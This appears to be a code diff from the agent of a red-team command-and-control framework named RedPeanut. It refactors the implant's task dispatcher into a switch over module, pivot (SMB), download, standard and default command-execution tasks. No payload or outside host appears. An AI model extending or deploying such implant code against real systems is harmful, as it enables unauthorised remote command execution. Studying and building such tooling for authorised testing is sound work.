@@ -115,23 +115,21 @@ namespace RedPeanutAgent
                     {
                         if (task.Agentid.Equals(agentid))
                         {
-                            if (task.TaskType.Equals("module"))
+                            switch(task.TaskType)
                             {
-                                try
-                                {
-                                    Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid,spawnp);
-                                    Thread commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteModule));
-                                    commandthread.Start();
-                                }
-                                catch (Exception)
-                                {
-                                    
-                                }
-                            }
-                            else
-                            {
-                                if (task.TaskType.Equals("pivot"))
-                                {
+                                case "module":
+                                    try
+                                    {
+                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
+                                        Thread commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteModule));
+                                        commandthread.Start();
+                                    }
+                                    catch (Exception)
+                                    {
+
+                                    }
+                                    break;
+                                case "pivot":
                                     if (!smbstarted)
                                     {
                                         try
@@ -143,42 +141,46 @@ namespace RedPeanutAgent
                                         }
                                         catch (Exception)
                                         {
-                                            
-                                        }
-                                    }
-                                }
-                                else
-                                {
-                                    if (task.TaskType.Equals("standard") || task.TaskType.Equals("download"))
-                                    {
-                                        try
-                                        {
-                                            Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid,spawnp);
-                                            Thread commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteLocal));
-                                            commandthread.Start();
-                                        }
-                                        catch (Exception)
-                                        {
-                                            
-                                        }
-                                    }
-                                    else
-                                    {
-                                        try
-                                        {
-                                            Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid,spawnp);
-                                            Thread commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteCmd));
-                                            commandthread.Start();
-                                        }
-                                        catch (Exception)
-                                        {
-                                            
-                                        }
-                                    }
-                                }
 
+                                        }
+                                    }
+                                    break;
+                                case "download":
+                                    try
+                                    {
+                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
+                                        Thread commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteLocal));
+                                        commandthread.Start();
+                                    }
+                                    catch (Exception)
+                                    {
+
+                                    }
+                                    break;
+                                case "standard":
+                                    try
+                                    {
+                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
+                                        commandExecuter.ExecuteLocal();
+                                    }
+                                    catch (Exception)
+                                    {
+
+                                    }
+                                    break;
+                                default:
+                                    try
+                                    {
+                                        Execution.CommandExecuter commandExecuter = new Execution.CommandExecuter(task, pipe, wc, aeskey, aesiv, agentid, spawnp);
+                                        Thread commandthread = new Thread(new ThreadStart(commandExecuter.ExecuteCmd));
+                                        commandthread.Start();
+                                    }
+                                    catch (Exception)
+                                    {
+
+                                    }
+                                    break;
                             }
-
                         }
                         else
                         {
